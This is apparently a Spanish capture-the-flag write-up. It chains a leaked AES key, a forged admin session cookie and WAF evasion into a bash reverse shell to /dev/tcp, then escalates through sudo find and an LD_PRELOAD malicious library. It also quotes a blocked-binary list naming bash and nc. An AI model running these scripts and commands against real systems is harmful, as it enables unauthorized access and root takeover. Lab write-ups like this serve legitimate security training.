## Reconocimiento:

Puerto 5000 : http Werkzeug httpd 3.1.6

En la web no podemos interactuar, pero en el código hay un mensaje:

```bash
<!-- IMPORTANTE : Cambiar IV estático 0123456789abcdef por uno dinámico -->
```

Esto da una pista de que la vulnerabilidad es de criptografía y puede estar relacionado con cookies.

Probando fuzzing:

```bash
gobuster dir --url http://<IP>:5000/ -w <WORDLIST> -x html,php,txt,bak,zip,backup -t 100 -k
```

Encuentro: env.bak

Info:

```bash
SECRET_KEY = 'H4ckTh3Pl4n3t_26'
```

Esto puede ser la clave para firmar o cifrar las cookies de sesión.

Para descifrar la cookie utilizo un script de Dise0:

```python
#!/usr/bin/env python3
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import base64

COOKIE = "COOKIE"
SECRET_KEY = b"H4ckTh3Pl4n3t_26"

def decrypt_cookie(cookie_b64):
    data = base64.b64decode(cookie_b64)
    iv = data[:16]
    ct = data[16:]
    
    cipher = Cipher(algorithms.AES(SECRET_KEY), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted_padded = decryptor.update(ct) + decryptor.finalize()
    
    # PKCS7 unpadding (quitamos 0C bytes = 12 bytes padding)
    padding_len = decrypted_padded[-1]
    plaintext = decrypted_padded[:-padding_len]
    
    return plaintext.decode()

# MOSTRAR CONTENIDO
plaintext = decrypt_cookie(COOKIE)
print(f"📄 TU COOKIE DESCIFRADA:")
print(f"   '{plaintext}'")
```

```python
python3 decode.py
```

Info:

```
📄 TU COOKIE DESCIFRADA:   ', "is_admin": false}'
```

Confirma que la cookie tiene un campo booleano “is_admin”, el cual determina los privilegios de usuario. Sabiendo esto hay que generar una cookie válida modificando el valor a “true”.

Aquí Dise0 se la vuelve a marcar haciendo otro script:

```python
#!/usr/bin/env python3
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
import base64

COOKIE = "COOKIE"
SECRET_KEY = b"H4ckTh3Pl4n3t_26"

def decrypt_cookie(cookie_b64):
    data = base64.b64decode(cookie_b64)
    iv = data[:16]
    ct = data[16:]
    cipher = Cipher(algorithms.AES(SECRET_KEY), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted_padded = decryptor.update(ct) + decryptor.finalize()
    unpadder = padding.PKCS7(128).unpadder()
    plaintext = unpadder.update(decrypted_padded) + unpadder.finalize()
    return plaintext.decode('utf-8')

def create_admin_cookie():
    # EXACTAMENTE igual estructura que original pero is_admin: true
    json_original = ', "is_admin": false}'
    json_admin = ', "is_admin": true}'  # MISMA longitud 20 bytes
    
    # Mismo IV original
    data = base64.b64decode(COOKIE)
    iv = data[:16]
    
    # PKCS7 padding automático
    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(json_admin.encode()) + padder.finalize()
    
    cipher = Cipher(algorithms.AES(SECRET_KEY), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    ct = encryptor.update(padded_data) + encryptor.finalize()
    
    return base64.b64encode(iv + ct).decode()

# EJECUTAR
print("🔓 COOKIE ADMIN - MISMA ESTRUCTURA")
plaintext = decrypt_cookie(COOKIE)
print(f"📄 ORIGINAL: '{plaintext}' ({len(plaintext)} bytes)")

admin_cookie = create_admin_cookie()
print(f"\n👑 COOKIE ADMIN (misma longitud):")
print(f"user_session={admin_cookie}")

print(f"\n🚀 PEGA ESTA EN DEVTOOLS → Cookies → user_session")
```

Finalmente, sustituimos el valor de la cookie `user_session` en el navegador (`DevTools → Storage → Cookies`) por la nueva cookie generada. Y así obtendremos el panel de administrador.

En el panel hay una “Consola de Diagnóstico”, intentando técnicas de bypasseo encuentro un WAF
Intentando varias encuentro que con el carácter “&” deja concatenar comandos, listando con ls -la hay una [app.py](http://app.py), viendo su  contenido observamos que:

- Se bloquean operadores comunes de ejecución (`;`, `&&`, `|`, etc.)
- También se filtran nombres de binarios típicos usados para explotación (`bash`, `python`, `nc`, etc.)

Esto implica que debemos **evadir el filtro mediante técnicas de ofuscación**.

Usando una técnica basada en fragmentación de cadenas, por ejemplo:

```bash
b''ash
```

Le inyectamos una rev shell antes poniéndome a la escucha:

```bash
&echo "b''ash -i >& /dev/tcp/<IP>/<PORT> 0>&1" > rv.sh
&chmod +x rv.sh
&b''ash rv.sh
```

## Escalada firstatack → chocolate

```bash
sudo -l
(chocolate) NOPASSWD: /usr/bin/find
```

Sin ningún tipo de problema:

```bash
sudo -u chocolate find . -exec /bin/bash \; -quit
```

## Escalada chocolate → root

```bash
sudo -l
(root) SETENV: NOPASSWD: /usr/local/bin/syscheck
```

Con SETENV podemos definir variables de entorno arbitrarias, lo cual permite un LD_PRELOAD hijacking (en el momento de realizarla no sabia que era, así que otra vez Dise0 con su traje de superman aparece en este writeup)

Primero crea una libreria maliciosa en C:

```c
cat > /tmp/syscheck.c << 'EOF'
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

__attribute__((constructor))
void root_shell() {
  if (geteuid() == 0) {
    setuid(0);
    setgid(0);
    execve("/bin/sh", NULL, NULL);
  }
}

int main() {
  puts("System Status: All systems operational.");
  return 0;
}
EOF
```

Luego la compìla:

```bash
gcc -fPIC -shared -o /tmp/syscheck.so /tmp/syscheck.c -nostartfiles
```

Ejecución:

```bash
sudo LD_PRELOAD=/tmp/syscheck.so /usr/local/bin/syscheck
```

Y listo.
